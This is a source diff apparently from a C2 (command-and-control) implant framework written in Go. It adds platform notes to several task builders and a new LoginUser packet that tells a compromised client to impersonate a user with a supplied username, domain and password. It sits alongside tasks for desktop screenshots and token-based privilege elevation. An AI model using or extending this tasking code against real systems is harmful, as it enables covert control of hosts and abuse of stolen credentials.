@@ -64,6 +64,8 @@ func Refresh() *com.Packet {
 //
 // This task result does not return any data, only errors if it fails.
 //
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
 // C2 Details:
 //  ID: MvRevSelf
 //
@@ -79,6 +81,8 @@ func RevToSelf() *com.Packet {
 // attempt to get a screenshot of all the current active desktops on the host.
 // If successful, the returned data is a binary blob of the resulting image,
 // encoded in the PNG image format.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
 //
 // C2 Details:
 //  ID: TVScreenShot
@@ -355,6 +359,8 @@ func ProxyRemove(name string) *com.Packet {
 // provided Filter to attempt to get a Token handle to an elevated process. If
 // the Filter is nil, then the client will attempt at any elevated process.
 //
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
 // C2 Details:
 //  ID: MvElevate
 //
@@ -474,6 +480,29 @@ func Proxy(name, addr string, p []byte) *com.Packet {
 	n.WriteUint8(2)
 	n.WriteString(addr)
 	n.WriteBytes(p)
+	return n
+}
+
+// LoginUser returns an impersonate user Packet. This will instruct the client to
+// use the provided credentials to change it's Token to the user that owns the
+// supplied credentials.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvLoginUser
+//
+//  Input:
+//      string // Username
+//      string // Domain
+//      string // Password
+//  Output:
+//      <none>
+func LoginUser(user, domain, pass string) *com.Packet {
+	n := &com.Packet{ID: TvLoginUser}
+	n.WriteString(user)
+	n.WriteString(domain)
+	n.WriteString(pass)
 	return n
 }
 
